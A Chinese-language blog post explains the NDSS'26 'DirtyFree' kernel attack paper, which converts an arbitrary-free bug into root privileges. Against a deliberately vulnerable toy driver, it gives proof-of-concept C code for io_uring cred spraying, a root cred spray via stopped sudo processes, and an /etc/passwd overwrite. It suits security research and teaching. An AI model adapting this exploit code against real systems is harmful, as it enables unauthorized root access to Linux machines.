---
title: "[NDSS'26] DirtyFree: Simplified Data-Oriented Programming in the Linux Kernel"
date: 2026-03-12
authors: [nova]
---

> https://www.ndss-symposium.org/ndss-paper/dirtyfree-simplified-data-oriented-programming-in-the-linux-kernel/

提出了一种新的攻击手段，可以将 partial-overwrite 的攻击仅用一个原语就转换为权限提升，并且可以绕过 `SLAB_VIRTUAL` (未合入主线，在 [kCTF mitigation bypass](https://google.github.io/security-research/kernelctf/rules.html#2-mitigation-bypass-on-the-mitigation-instance) 里使用，[RFC](https://lore.kernel.org/lkml/20230915105933.495735-9-matteorizzo@google.com/#r) 两三年没更新应该是合不了主线了）这种防止 Temporal CrossCache Attack 的缓解措施。



## Proof of Concept

### Threat Model

与大多数 upstream linux distribution 使用的内核类似，开启了 KASLR、SMEP、SMAP、KPTI，除此之外额外开启了 KCFI 和 SLAB_VIRTUAL



拥有一个漏洞驱动，可以分配至多 5 个 note，note 可读可写可分配可释放，在释放后不清理指针，导致存在 UAF 漏洞。

```c
#define MAX_SIZE 0x1000
#define MAX_NOTES 5

struct vuln_request {
    unsigned long long size; // Less than 0x1000
    unsigned long long addr;
    unsigned long long idx;  // Note index (0-4)
    char __user *data;
};

struct note {
    size_t size;
    char *data;
};

static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct vuln_request __user *req = (struct vuln_request __user *)arg;

    switch (cmd) {
    case VULN_ALLOC:
        return handle_alloc(req);
    case VULN_FREE:
        return handle_free(req);
    case VULN_READ:
        return handle_read(req);
    case VULN_WRITE:
        return handle_write(req);
    default:
        return -ENOTTY;
    }
}
```

### Overview

![Overview of DirtyFree](https://cdn.nova.gal/img/image-20260312134727448.png)

在 PoC 里，攻击思路有所简化，但整体仍遵从上图。

1. 堆喷 User Cred
2. 部分覆写指针使其指向其中一个 User Cred
3. 使用 Arbitrary Free Permitive 释放 User Cred，制造 Cred UAF
4. 堆喷 Root Cred，使之前的 User Cred 被覆盖为 Root Cred
5. 提权



不难思考，因为 Cred 等危险结构体都被专门分配到了诸如 `cred_jar` 等 `dedicated cache`，无法轻易造成 UAF，因此其他一些 DOP 手段选择利用 CrossCache 这样更加 low-level 的方法绕过。而 DirtyFree 则通过 ArbitraryFree 原语直接进行释放并重用，既简化了流程，又使得整个攻击可靠性相对较高（得益于其所在的 `dedicated cache`）。据作者论文指出，在待机状态下能达到接近 96% 的利用可靠性，虽然我不行。

> We observe that DIRTYFREE achieves a success rate of 95.6% in the idle state and 87.4% in the busy state.

接下来，我们针对每一个环节进行讲解。

### 1. User cred spray

为了尽可能精确的预测 User Cred 的位置，我们理应喷射尽可能多的 cred 结构体。然而，更多的喷射意味着更多的噪声，也就意味着更加不可控的内存布局。例如 `fork()` 系统调用虽然能够产生 cred 结构体，但它既无法做到“大量”（受到进程数量限制），也无法做到“可控”（调用过程中分配多种不同的结构体，例如 `task_struct`，干扰堆布局）。作者使用了 IO_URING 系列的系统调用，具体而言，利用 `IORING_REGISTER_PERSONALITY `调用 `capset()` syscall 时，内核会通过复制当前的凭证来分配新的 cred 对象，而不会产生额外的无关对象，在此之后，使用相同的标志调用 `io_uring_register()`，即可增加它们的引用计数，防止它们被释放。这种方法可靠地提供了一个完全由 cred 结构体组成的，且极度密集的堆喷。

```c
int app_setup_uring(struct submitter *s, unsigned int entries)
{
    struct app_io_sq_ring *sring = &s->sq_ring;
    struct app_io_cq_ring *cring = &s->cq_ring;
    struct io_uring_params p;
    void *sq_ptr, *cq_ptr;

    memset(&p, 0, sizeof(p));
    p.wq_fd = -1;

    s->ring_fd = io_uring_setup(entries, &p);
    if (s->ring_fd < 0) {
        perror("io_uring_setup");
        return 1;
    }

    /* Calculate ring buffer sizes */
    int sring_sz = p.sq_off.array + p.sq_entries * sizeof(unsigned);
    int cring_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);

    /* Check if single mmap is supported (kernel 5.4+) */
    if (p.features & IORING_FEAT_SINGLE_MMAP) {
        if (cring_sz > sring_sz) {
            sring_sz = cring_sz;
        }
        cring_sz = sring_sz;
    }

    /* Map submission queue ring buffer */
    sq_ptr = mmap(0, sring_sz, PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_POPULATE, s->ring_fd, IORING_OFF_SQ_RING);
    if (sq_ptr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    /* Map completion queue ring buffer */
    if (p.features & IORING_FEAT_SINGLE_MMAP) {
        cq_ptr = sq_ptr;
    } else {
        cq_ptr = mmap(0, cring_sz, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE, s->ring_fd, IORING_OFF_CQ_RING);
        if (cq_ptr == MAP_FAILED) {
            perror("mmap");
            return 1;
        }
    }

    /* Initialize submission queue ring structure */
    sring->head = sq_ptr + p.sq_off.head;
    sring->tail = sq_ptr + p.sq_off.tail;
    sring->ring_mask = sq_ptr + p.sq_off.ring_mask;
    sring->ring_entries = sq_ptr + p.sq_off.ring_entries;
    sring->flags = sq_ptr + p.sq_off.flags;
    sring->array = sq_ptr + p.sq_off.array;

    /* Initialize completion queue ring structure */
    cring->head = cq_ptr + p.cq_off.head;
    cring->tail = cq_ptr + p.cq_off.tail;
    cring->ring_mask = cq_ptr + p.cq_off.ring_mask;
    cring->ring_entries = cq_ptr + p.cq_off.ring_entries;
    cring->cqes = cq_ptr + p.cq_off.cqes;

    /* Map submission queue entries array */
    s->sqes = mmap(0, p.sq_entries * sizeof(struct io_uring_sqe),
                   PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
                   s->ring_fd, IORING_OFF_SQES);
    if (s->sqes == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    return 0;
}

void alloc_n_creds(int uring_fd, size_t n_creds)
{
    for (size_t i = 0; i < n_creds; i++) {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3
        };

        struct user_cap_data_struct cap_data[2] = {
            {.effective = 0, .inheritable = 0, .permitted = 0},
            {.effective = 0, .inheritable = 0, .permitted = 0}
        };

        /* Allocate new credential */
        if (syscall(SYS_capset, &cap_hdr, (void *)cap_data))
            fatal("capset() failed");

        /* Register with io_uring to increment refcount */
        if (syscall(SYS_io_uring_register, uring_fd,
                    IORING_REGISTER_PERSONALITY, 0, 0) < 0)
            fatal("io_uring_register() failed");
    }
}

void spray_user_creds(struct submitter *uring_cred)
{
    printf("[*] Setting up io_uring for credential spray...\n");
    app_setup_uring(uring_cred, 0x80);

    printf("[*] Spraying user credentials into kernel heap...\n");
    alloc_n_creds(uring_cred->ring_fd, 0xffff);

    printf("[+] User credential spray complete\n");
}
```

以这个例子而言，它分配了 0xffff 个 0xc0 大小的 cred 结构体，占据了 12MB 的空间，使得我们能够拥有一个极其可预测的堆布局。



### 2. Partial pointer overwrite

这里就没有特别多细节了。

能够 Partial Overwrite 那就不用泄露，找一个命中期望率比较高的地方，改低几位就可以。

不能那就得泄露 heap address 然后改。



### 3. Arbitrary Free

在 PoC 中，这个能力由漏洞驱动本身提供。在 DirtyFree 中，作者整理了能够做到这点的结构体，覆盖了除 `kmalloc-8` 之外的所有 general cache，也就意味着在这些 cache 里的漏洞驱动，都可以利用他们来做 arbitrary free



### 4.Root cred spray

这里思路也没有什么新鲜的，利用 SUID 的程序然后 fork 。

作者把进程 stop 了，以保证凭证不会被释放。

```c
void spray_root_creds(void)
{
    printf("[*] Spraying root credentials via sudo processes...\n");

    for (int i = 0; i < 2048; i++) {
        int pid = fork();
        if (!pid) {
            /* Child process: exec sudo */
            execve("/usr/bin/sudo", (char *[]){"/usr/bin/sudo", NULL}, NULL);
            perror("execve sudo");
            exit(-1);
        } else if (pid > 0) {
            /* Parent process: stop child to keep credentials allocated */
            usleep(1500);
            kill(pid, SIGSTOP);
        } else {
            perror("fork");
            exit(-1);
        }
    }

    printf("[+] Root credential spray complete\n");
}
```



### 5. Privilege Escalation

由于我们堆喷了 65536 个 cred，无法得知究竟是哪个 cred 结构体被覆盖，因此直接起 Shell 肯定是不太实际的。

一般思路就是利用 `open()` 打开并写入一个特权文件，例如，`/etc/passwd`。

当然，这里我们仍然需要使用 IO_URING 系列的操作。

```c
int submit_to_sq(struct submitter *s, struct io_uring_sqe *sqes,
                 unsigned int sqe_len, unsigned int min_complete)
{
    struct app_io_sq_ring *sring = &s->sq_ring;
    unsigned index, head, tail, next_tail, mask, to_submit;

    next_tail = tail = *sring->tail;

    /* Add entries to submission queue */
    for (to_submit = 0; to_submit < sqe_len; to_submit++) {
        read_barrier();
        head = *sring->head;
        mask = *s->sq_ring.ring_mask;

        /* Check if queue is full */
        if ((head & mask) == (tail & mask) && head != tail) {
            break;
        }

        next_tail++;
        index = tail & mask;
        struct io_uring_sqe *sqe = &s->sqes[index];
        memcpy(sqe, &sqes[to_submit], sizeof(*sqe));
        sring->array[index] = index;
        tail = next_tail;
    }

    /* Update tail pointer */
    if (*sring->tail != tail) {
        *sring->tail = tail;
        write_barrier();
    }

    /* Submit to kernel */
    int ret = io_uring_enter(s->ring_fd, to_submit, min_complete,
                             IORING_ENTER_GETEVENTS);
    if (ret < 0) {
        perror("io_uring_enter");
        return ret;
    }

    return to_submit;
}


int read_from_cq(struct submitter *s, bool print, int *reaped_success,
                 int *results)
{
    struct app_io_cq_ring *cring = &s->cq_ring;
    struct io_uring_cqe *cqe;
    unsigned head, reaped = 0, success = 0;

    head = *cring->head;

    do {
        read_barrier();

        /* Check if queue is empty */
        if (head == *cring->tail)
            break;

        /* Get completion entry */
        cqe = &cring->cqes[head & *s->cq_ring.ring_mask];

        if (print) {
            if (cqe->res < 0) {
                printf("    [CQE] res=%d (error: %s), user_data=0x%llx\n",
                       cqe->res, strerror(abs(cqe->res)), cqe->user_data);
            } else {
                printf("    [CQE] res=%d, user_data=0x%llx\n",
                       cqe->res, cqe->user_data);
            }
        }

        if (cqe->res >= 0) {
            success++;
            if (results) {
                *results++ = cqe->res;
            }
        }

        head++;
        reaped++;
    } while (1);

    *cring->head = head;
    write_barrier();

    if (reaped_success != NULL) {
        *reaped_success = success;
    }

    return reaped;
}

void overwrite_passwd(struct submitter *uring_cred, int root_fd, const char *fake_passwd)
{
    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));

    /* Prepare OPENAT operation for /etc/passwd */
    sqe.opcode = IORING_OP_OPENAT;
    sqe.fd = root_fd;
    sqe.addr = (__u64)"etc/passwd";
    sqe.open_flags = O_RDWR;
    sqe.len = 0;
    sqe.file_index = 0;

    printf("[*] Scanning through credentials to find root cred...\n");

    int reaped_success = 0, reap_cnt = 0, flag_fd;

    /* Try each personality until we find one that can open /etc/passwd */
    for (int i = 0; i < 0xffff && !reaped_success; i++) {
        reap_cnt++;
        sqe.personality = i + 1;
        submit_to_sq(uring_cred, &sqe, 1, 1);
        read_from_cq(uring_cred, false, &reaped_success, &flag_fd);
    }

    if (!reaped_success) {
        fatal("[!] Failed to open /etc/passwd (root cred not found)");
    }

    printf("[+] Successfully opened /etc/passwd with cred 0x%x, fd: %d\n", reap_cnt, flag_fd);

    /* Write fake passwd entry */
    write(flag_fd, fake_passwd, strlen(fake_passwd));

    printf("[+] /etc/passwd overwritten with root entry!\n");
}
```

### 调试相关

简单记录一下以供参考

```bash
gdb-gef --ex "target remote :1234" --ex "ksymaddr-remote-apply" --ex "kmod-load ToyExample ToyExample.ko" --ex "b prepare_creds" --ex "b ToyExample.c:224" --ex "b ToyExample.c:152"
```

```bash
gef> p/x *(struct cred *)$1
gef> slub-dump kmalloc-192 -vv
gef> b __x64_sys_io_uring_enter
gef> slab-contains 0xffff9ce542b6d180
```



## Arbitrary Free Object

咕了
